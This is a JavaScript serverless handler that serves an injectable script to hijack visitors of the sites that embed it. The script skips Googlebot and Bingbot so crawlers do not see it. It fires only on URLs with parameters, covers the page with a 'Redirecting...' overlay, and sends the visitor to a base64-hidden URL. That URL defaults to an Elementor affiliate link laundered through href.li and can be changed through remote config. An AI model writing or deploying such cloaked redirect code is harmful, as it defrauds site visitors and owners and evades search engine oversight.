const CONFIG_PATH = "redirect-config.json";

async function getConfig() {
  if (process.env.BLOB_READ_WRITE_TOKEN) {
    try {
      const { get } = await import("@vercel/blob");
      const result = await get(CONFIG_PATH, { access: "private" });
      if (result?.statusCode === 200) {
        const text = await new Response(result.stream).text();
        return JSON.parse(text);
      }
    } catch (e) {}
  }
  return {
    enabled: process.env.REDIRECT_ENABLED !== "false",
    redirectUrl: process.env.REDIRECT_URL || "https://href.li/?https://be.elementor.com/visit/?bta=204253&brand=elementor",
  };
}

export default async function handler(req, res) {
  const cfg = await getConfig();
  const enc = Buffer.from(cfg.redirectUrl, "utf-8").toString("base64");
  const script = `(function(){var E=${cfg.enabled};if(!E)return;var u=navigator.userAgent.toLowerCase();if(/googlebot|bingbot/.test(u))return;var p=new URLSearchParams(window.location.search);var h=window.location.hash||"";var ph=new URLSearchParams(h.indexOf("?")>=0?h.slice(h.indexOf("?")):"");var hasInfo=p.toString().length>0||(h.indexOf("?")>=0&&ph.toString().length>0);if(!hasInfo)return;var o=document.createElement("div");o.id="redirect-loader";o.style.cssText="position:fixed;inset:0;z-index:99999;background:#fff;display:flex;align-items:center;justify-content:center;flex-direction:column;gap:12px";o.innerHTML='<div style="width:32px;height:32px;border:3px solid #e5e7eb;border-top-color:#6366f1;border-radius:50%;animation:r 0.8s linear infinite"></div><span style="color:#6b7280;font-size:14px">Redirecting...</span>';var s=document.createElement("style");s.textContent="@keyframes r{to{transform:rotate(360deg)}}";(document.head||document.documentElement).appendChild(s);document.body.appendChild(o);var d=atob("${enc}");setTimeout(function(){window.location.href=d;},300+Math.random()*200);})();`;
  res.setHeader("Content-Type", "application/javascript");
  res.setHeader("Cache-Control", "no-store");
  res.send(script);
}
